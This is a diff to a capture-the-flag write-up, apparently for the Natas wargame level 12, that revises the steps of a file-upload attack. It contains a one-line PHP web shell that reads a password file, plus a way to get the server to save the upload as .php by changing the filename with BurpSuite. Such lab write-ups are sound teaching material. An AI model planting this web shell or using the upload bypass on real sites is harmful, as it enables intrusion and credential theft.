@@ -20,7 +20,7 @@ The page allows users to upload an image file and displays it.
 
 ## Finding the Password
 
-### Using Browser
+### Using Browser & BurpSuite
 1. Open the source code.
 2. Open the source code. It shows the `PHP` logic used:
     ```php
@@ -40,15 +40,11 @@ The page allows users to upload an image file and displays it.
     ```php
     <?php system('cat /etc/natas_webpass/natas13'); ?>
     ```
-5. Upload the file normally and modify:
-   ```html
-   <input type="hidden" name="filename" value="shell.php" />
-   ```
-6. Intercept this request using BurpSuite:
+5. Upload the file normally and Intercept this request using BurpSuite:
     ![](./modified_request.png)
-    - modify the `abcd.jpg` to `shell.php` as shown in picture.
-7. The file is uploaded as a `abcd.php` file.
-8. Access the uploaded file to reveal flag.
+    - Modify the `abcd.jpg` with `shell.php` as shown in picture.
+6. The file is uploaded as a `abcd.php` file.
+7. Access the uploaded file to reveal flag.
 
 #### Proof
 ```text
